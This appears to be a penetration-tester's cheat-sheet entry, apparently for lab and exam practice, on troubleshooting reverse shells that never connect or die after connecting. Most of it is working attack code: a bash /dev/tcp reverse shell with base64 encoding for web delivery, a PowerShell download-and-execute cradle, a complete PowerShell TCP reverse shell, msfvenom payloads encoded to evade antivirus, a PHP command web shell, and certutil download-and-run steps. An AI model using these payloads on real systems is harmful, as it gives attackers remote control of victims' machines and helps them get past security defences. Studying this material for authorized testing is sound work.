title: Shell Troubleshooting
body:
Shell not catching, or catching and then dying. Work through this systematically - the failure mode is almost always one of a handful of things, and the order below is roughly most-to-least common.

One important split: a shell that NEVER connects is a network/payload/encoding problem (items 1-7). A shell that connects, prints a banner, and then goes silent or dies is usually a PLATFORM problem - the wrong shell type for the target OS, or a process that something else is killing (items 8-9). Don't debug the second class with the first class's checklist; you'll burn an hour on egress that already works.
cmd:
# -- BIND SHELL VS REVERSE SHELL ──────────
# Reverse shell: target connects BACK to you (nc -nlvp PORT on Kali)
# Bind shell:    target LISTENS, you connect TO it (nc $ip PORT)
# Some exploits (e.g. CVE-2007-4560 clamav-milter) open bind shells
# If exploit fires but nothing hits your listener — try nc $ip <port>
# Lab: ClamAV — exploit opened port 31337 on target, no listener needed

# -- SCRIPT INTERPRETER ISSUES ─────────────
# No shebang line = bash tries to run it = silent failure
# perl scripts: always call  perl script.pl  not  ./script.pl
# python scripts: python3 script.py
# ruby scripts: ruby script.rb
# Old boxes may not have python3 — try python for PTY upgrade

# -- DIAGNOSTIC CHECKLIST -----------------

# 1. CAN THE TARGET REACH YOU?
# On target:
ping $lhost -c 1       # ICMP allowed?
curl http://$lhost      # HTTP out allowed?
# On attacker — watch tcpdump:
sudo tcpdump -i tun0 icmp
sudo tcpdump -i tun0 port $lport
# No ping = strict egress — try ports 80, 443, 53

# 2. WRONG PORT — FIREWALL FILTERING
# Retry with common allowed egress ports:
export lport=443   # HTTPS — almost never blocked
export lport=80    # HTTP
export lport=53    # DNS (use for tunnel not reverse shell normally)
nc -nlvp 443

# 3. SHELL BINARY NOT AVAILABLE
# Test what's on the target:
which bash sh python python3 perl ruby nc ncat
# Use whatever is present in the payload

# 4. ENCODING ISSUE (web delivery)
# Spaces and special chars break bash -c in web context
# Use base64 brace expansion — no spaces, no special chars:
echo 'bash -i >& /dev/tcp/$lhost/$lport 0>&1' | base64 -w0
# Take the output (B64) and deliver as:
bash -c '{echo,B64OUTPUT}|{base64,-d}|{bash,-i}'

# PowerShell must use UTF-16LE encoding (not UTF-8):
echo 'IEX(New-Object Net.WebClient).DownloadString("http://$lhost/shell.ps1")' | iconv -t UTF-16LE | base64 -w0
powershell -nop -w hidden -enc B64OUTPUT

# Quick test — does base64 decode correctly?
echo "B64OUTPUT" | base64 -d  # verify payload before delivery

# 5. AV/AMSI BLOCKING BINARY
# Switch to: encoded PS, msfvenom with encoding, or manual AMSI bypass
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=443   -f exe -e x64/xor_dynamic -i 5 -o shell_enc.exe

# 7. NESTED QUOTE ParserError ("Unexpected token" spawning a shell)
# Symptom: you're ALREADY in powershell/cmd and wrap the payload like:
#   cmd -c "powershell -nop -c "$client = New-Object ...""
# The inner " closes the outer string EARLY, so PowerShell parses the rest
# as a bare expression and chokes on the trailing quotes:
#   Unexpected token '""' in expression or statement
# Cause is the nested unescaped double-quotes, NOT a bad payload.
#
# Fix A - you're already IN PowerShell: drop the wrapper, paste the payload
# raw. Its own strings use single-quotes ('$lhost', 'PS '), so it parses
# clean with no cmd wrapper and no outer "":
$client = New-Object System.Net.Sockets.TCPClient('$lhost',$lport);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
#
# Fix B - need it as ONE liner (RCE field / cmd context): base64 it so the
# quoting stops mattering entirely. -enc expects UTF-16LE base64:
echo -n '<PS payload, double-quotes fine now>' | iconv -t UTF-16LE | base64 -w0
powershell -nop -enc <BASE64>
#
# Gotcha: the cmd wrapper is  cmd /c  (NOT cmd -c). But in PS you don't need it.

# 6. INTERACTIVE SHELL NEEDED (su, ssh)
# Some exploits give non-interactive — upgrade immediately
script /dev/null -c bash
python3 -c 'import pty; pty.spawn("/bin/bash")'


# 8. CONNECTS, PRINTS A BANNER, THEN SILENT — PHP INTERACTIVE SHELL ON WINDOWS
# Symptom: nc catches the connection, you see
#     Microsoft Windows [Version 10.0.xxxxx]
#     C:\xampp\htdocs>
#   ...and then every command you type returns nothing. Enter does nothing.
#   Feels like buffering. It is not buffering, and no flag fixes it.
#
# CAUSE: PHP's stream_select() on Windows only accepts SOCKET resources. The
#   pipe handles returned by proc_open() are not sockets, so the select loop
#   never reports the pipes readable and output never flows back to you. Every
#   pentestmonkey-lineage PHP reverse shell is built on exactly this loop, so
#   they all fail the same way on a Windows/XAMPP target. (The banner appears
#   because that's cmd.exe's own startup write, not your loop working.)
#   The same shell works perfectly on Linux — the loop is fine, the platform isn't.
#
# ALSO NOT THE FIX: pcntl_fork / posix_setsid are Linux-only, and `sh -i` does
#   not exist on Windows. A "universal" PHP shell that only swaps cmd.exe for
#   /bin/sh still dies here.
#
# FIX: on Windows, use PHP as a DROPPER, not as the shell.
#   1) Prove execution with a cmd-shell:   <?php system($_GET['cmd']); ?>
#        ?cmd=whoami   -> confirms RCE
#   2) Stage a real binary and catch THAT:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=443 -f exe -o rev.exe
python3 -m http.server 80
#        ?cmd=certutil+-urlcache+-f+http://$lhost/rev.exe+C:\Windows\Temp\rev.exe
#        ?cmd=C:\Windows\Temp\rev.exe
#   (If you must stay in-process, replace stream_select with non-blocking
#    fread() on the pipes plus a short usleep loop — but the dropper is faster
#    and you'll want the binary for privesc anyway.)

# 9. RAN AS A SERVICE BINARY, DIES AFTER ~30 SECONDS
# Symptom: you replaced a service exe (weak service permissions), rebooted,
#   your beacon/implant checks in once — then the session goes dead.
# CAUSE: the Service Control Manager starts your binary as a service. A plain
#   executable never answers the service control handshake, so SCM terminates
#   it once the service start timeout expires (~30s default).
# FIX: use the smallest payload that connects IMMEDIATELY
#   (windows/x64/shell_reverse_tcp is ~460 bytes and connects on execution),
#   or wrap the payload so it spawns a child process and returns cleanly.
#   Do NOT use a staged/beaconing implant as a service binary.
warn: tcpdump is your ground truth. Run it on tun0 BEFORE executing payload. If you see the connection hit your interface but nc catches nothing: wrong port on listener. If nothing hits interface at all: egress filtered or wrong LHOST. "Unexpected token" / ParserError while spawning a shell = nested-quote problem, not a broken payload: if you're already in PowerShell drop the cmd/powershell wrapper, or base64-encode with iconv -t UTF-16LE and use -enc. A shell that connects, banners, then goes silent on a Windows/XAMPP target is not your network and not your payload's port - it's PHP's stream_select() being socket-only on Windows. Stop debugging and switch to a dropper. A shell that dies ~30s after a reboot is SCM killing a non-service binary.

choices.label: Windows target - use PHP as a dropper instead
Died after reboot - service binary swap
